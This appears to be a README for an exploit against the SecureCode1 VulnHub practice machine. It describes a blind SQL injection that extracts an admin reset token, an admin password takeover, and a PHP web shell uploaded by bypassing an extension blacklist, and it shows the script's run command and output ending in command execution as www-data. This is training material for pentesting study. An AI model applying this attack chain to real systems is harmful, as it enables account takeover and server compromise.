# SecureCode1 VulnHub Exploit
SecureCode1 from [VulnHub](https://www.vulnhub.com/entry/securecode-1,651/) is a white box pentesting challenege that is similar to machines found in the OSWE exam.

## Vulnerabilities:

1 - Auth Bypass: Exploits blind SQL injection to extract admin token, which allows for password reset of admin account.

2 - RCE via File Upload: There are two ways to do that. The newItem endpoint requires bypassing both blacklisted file extensions and allowed MIME types. The other endpoint is updateItem (the one I used), which only requires bypassing blacklisted file extensions.

## Exploit:
```python
python SecureCode_Exploit.py 10.10.10.141 id
```
```bash
Extracting Token...
P
PL
PLY
PLYj
PLYjM
PLYjM1
PLYjM16
PLYjM16R
PLYjM16R1
PLYjM16R1I
PLYjM16R1Ij
PLYjM16R1IjS
PLYjM16R1IjSp
PLYjM16R1IjSpP
PLYjM16R1IjSpPa
[+] Complete Extracted Token: PLYjM16R1IjSpPa
[+] Admin Password Changed to admin123
[+] Successfully logged in as admin
[+] Admin PHPSESSID Cookie: hq76joflg1ds7346q7vui6s32s
[+] Successfully uploaded php CMD shell!
[+] Shell path: http://10.10.10.141/item/image/cmd.phar?cmd=
Response content:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
